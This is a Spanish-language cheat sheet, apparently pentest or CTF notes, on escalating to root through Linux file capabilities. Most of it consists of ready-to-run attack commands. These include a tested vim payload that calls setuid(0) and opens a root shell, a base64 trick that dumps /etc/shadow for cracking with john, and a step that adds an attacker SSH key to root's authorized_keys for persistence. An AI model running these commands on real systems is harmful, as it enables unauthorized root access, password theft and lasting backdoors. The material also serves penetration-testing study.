Resumen técnico — Escalada vía Linux Capabilities (ejemplo con `vim`)

1. Concepto

* Las **capabilities** delegan privilegios específicos a binarios sin usar SUID.
* Ejemplos útiles para escalada:

  * `cap_setuid+ep`: permite llamar `setuid()` y fijar UID=0.
  * `cap_dac_read_search+ep`: leer archivos ignorando DAC (p. ej., `/etc/shadow`).
* Sufijos:

  * `p` (permitted), `e` (effective). Para explotar normalmente necesitas **`+ep`**.

2. Enumeración

```bash
# listar recursivo, silenciando errores
getcap -r / 2>/dev/null

# comprobar capability concreta
getcap /usr/bin/vim
```

Salida típica vulnerable:

```
/home/alper/vim = cap_setuid+ep
```

Nota: no verás “s” de SUID (`ls -l` no lo mostrará) porque no es SUID; es **capability**.

3. Explotación (cap\_setuid en `vim`)

* Causa-efecto: si `vim` tiene `cap_setuid+ep`, desde `vim` puedes ejecutar Python/Ex-commands que llaman `setuid(0)` y luego un shell.
* Payload probado (Python 3 embebido en `vim`):

```bash
./vim -c ':py3 import os; os.setuid(0); os.execv("/bin/sh",["sh","-p","-c","reset; exec sh"])'
```

Resultados esperados:

```
# id
uid=0(root) gid=1000(...) groups=...
```

Variantes (si tu build no tiene `+python3`):

```bash
# con :terminal si está habilitado
./vim -c ':set shell=/bin/sh | :set shellcmdflag=-pc | :terminal reset; exec sh'

# con :! si la capability ya te elevó (algunas builds aplican setuid implícito)
./vim -c ':!sh -p'
```

4. Explotación (cap\_dac\_read\_search)
   Si ves:

```
/usr/bin/base64 = cap_dac_read_search+ep
```

entonces lectura privilegiada:

```bash
/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d > /tmp/shadow.dump
/usr/bin/base64 /etc/passwd | /usr/bin/base64 -d > /tmp/passwd.dump
unshadow /tmp/passwd.dump /tmp/shadow.dump > /tmp/hashes.txt
john /tmp/hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

5. Detalles prácticos

* Las capabilities viven en **xattrs**; copiarlas con `cp` normal suele **perderlas**. Verifica siempre con `getcap`.
* `setcap`/`getcap` vienen de `libcap2-bin`. Solo root (o `CAP_SETFCAP`) puede asignarlas:

  ```bash
  setcap cap_setuid+ep /ruta/binario
  setcap -r /ruta/binario   # retirar
  ```
* No es detectable con `find ... -perm -04000` (eso solo ve SUID). Debes usar `getcap`.

6. Flujo de trabajo recomendado

```bash
# 1) Enumerar
getcap -r / 2>/dev/null

# 2) Clasificar por capability
#   - cap_setuid+ep  -> intenta setuid(0) + shell (p.ej., payload de vim).
#   - cap_dac_*+ep   -> vuelca /etc/shadow, claves en /root, etc.

# 3) Validar
id; whoami

# 4) Persistencia mínima (si ya eres root)
echo 'ssh-rsa AAAA... attacker@host' >> /root/.ssh/authorized_keys
```
